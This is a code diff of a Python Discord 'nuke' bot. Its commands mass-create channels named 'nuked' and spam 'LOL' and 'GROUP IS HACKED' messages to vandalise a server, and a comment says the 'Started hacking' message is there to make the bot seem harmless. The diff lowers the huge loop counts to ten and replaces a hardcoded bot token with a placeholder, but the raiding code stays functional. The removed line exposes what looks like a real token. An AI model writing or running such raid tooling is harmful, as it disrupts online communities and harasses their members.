@@ -46,16 +46,16 @@ async def r(ctx, user: discord.User, role: discord.Role):
 async def c(ctx):
     await bot.say("Started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
     time.sleep(2)
-    for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
+    for i in range (0,10):
         await bot.create_channel(ctx.message.server, 'nuked', type=discord.ChannelType.text) #you can change the channel name by replacing 'nuked' to any name
 
  @bot.command(pass_context=True)
 async def s(ctx):
     await bot.say("Started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
     time.sleep(2)
-    for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
+    for i in range (0,10):
         await bot.say("LOL") #text 1 goes here
         await bot.say("GROUP IS HACKED") #text 2 goes here
 
 
- bot.run("Njk2NTM4ODAyNDgyNzA4NTYw.XoqMYA.JWFhnN-_0nFEt9z-VPAcRAa8yTA") #your bot token (please dont use your discord account token otherwise your account will get banned maybe)
+ bot.run("BOT_TOKEN") #your bot token (please dont use your discord account token otherwise your account will get banned maybe)
